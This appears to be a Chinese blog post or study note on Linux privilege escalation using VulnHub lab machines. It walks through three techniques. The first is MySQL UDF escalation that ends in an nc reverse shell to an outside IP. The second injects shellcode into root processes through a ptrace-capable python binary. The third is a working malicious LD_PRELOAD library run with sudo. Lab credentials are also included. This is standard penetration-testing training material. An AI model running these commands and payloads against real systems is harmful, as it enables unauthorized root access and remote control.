---
title: "Linux系统提权：Capability能力、LD_PRELOAD、数据库"
pubDate: 2026-08-22
tags:
  - 安全
  - 提权
---

Linux 提权配置类补充三招：数据库 UDF 手工提权（Linux 版）、Capability 能力滥用、LD_PRELOAD 函数劫持

## 概念先认识

- **Capability**：Linux 细粒度权限控制，把 root 权限拆成多个独立单元。如果某个文件带 `CAP_SETUID`、`CAP_SYS_ADMIN`、`CAP_SYS_PTRACE`、`CAP_DAC_OVERRIDE`、`CAP_FOWNER`、`CAP_SETFCAP`、`CAP_SYS_MODULE` 这些能力，就能尝试利用提权
- **LD_PRELOAD**：Linux 环境变量，让程序运行时优先加载指定的 .so 动态库，通过同名函数覆盖实现"函数劫持"。利用条件是 sudoers 里配了 `Defaults env_keep += LD_PRELOAD` + 有 sudo 权限的文件

## 数据库提权（Raven 2 靶机，Linux 版 MySQL UDF）

靶场：https://www.vulnhub.com/entry/raven-2,269/

入口：phpmailer 搭建的站点存在 RCE 漏洞（exploitdb 40974.py），打进去拿 shell 起交互终端，翻 wordpress 配置文件拿到 MySQL 账密 `root/R@v3nSecurity`

**两种打法**：
1. 工具梭
2. **手工 UDF 提权**

**手工流程**：先编译 udf.so → 上传到 /tmp → MySQL 导入导出到 plugin 目录 → 创建自定义函数执行命令：

```shell
# 1. kali 上拿 udf 提权源码并编译
searchsploit udf
cp /usr/share/exploitdb/exploits/linux/local/1518.c .
gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc

# 2. 上传到目标 /tmp，MySQL 里查版本和路径（决定 .so 放哪）
mysql -uroot -pR@v3nSecurity
select version();
show variables like '%basedir%';
show variables like '%secure%';    # 能否导出
show variables like '%plugin%';    # 插件目录

# 3. 导入导出 .so 到 plugin 目录（5.1+ 只允许从 plugin 路径加载）
use mysql;
create table shell(line blob);
insert into shell values(load_file('/tmp/udf.so'));
select * from shell into dumpfile '/usr/lib/mysql/plugin/udf.so';

# 4. 创建函数执行命令
create function do_system returns integer soname 'udf.so';
select do_system('nc 192.168.0.129 6666 -e /bin/bash');
```

**为什么先传 /tmp 再让 MySQL 导出**：低权限用户对 /plugin 目录没写权限，MySQL 是高权限用户有  数据库的高权限完成写入

## Capability 提权（Hacker Kid 靶机）

靶场：https://www.vulnhub.com/entry/hacker-kid-101,719/

入口：后台账密 `saket/Saket!#$%@!!` 登录，模板注入（Jinja SSTI）触发反弹 shell

**找能力**：

```shell
# 查单个文件能力
getcap /usr/bin/php
# 查所有文件能力
getcap -r / 2>/dev/null
```

扫到 python2.7 带 `cap_sys_ptrace` 能力，上传 inject.py（利用 ptrace 注入 shellcode 的脚本），遍历 root 进程注入：

```shell
for i in `ps -ef|grep root|grep -v "grep"|awk '{print $2}'`; do python2.7 inject.py $i; done
```

然后攻击机主动连目标 5600 端口（注入的 shellcode 起的 shell）：

```shell
nc <IP> 5600
```

成功提权

## LD_PRELOAD 提权（kali 演示）

**原理**：和 Windows DLL 劫持一样，只是 Linux 里是 .so 文件——程序运行时优先加载你指定的 .so，用同名函数覆盖原函数

**两个前提**（看 /etc/sudoers）：
1. `Defaults env_keep += LD_PRELOAD`（sudo 时保留 LD_PRELOAD 环境变量）
2. 有 sudo 权限的文件

**利用**：写恶意 .so 编译，sudo 运行 find 时预加载：

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

拿到 root shell

## 要点

今天看了 Linux 提权三种配置打法，数据库 UDF 就是编译 .so 借 MySQL 高权限导出到 plugin目录执行命令，capability就是找带ptrace能力的文件注入 root 进程，LD_PRELOAD 就是劫动态库加载提权
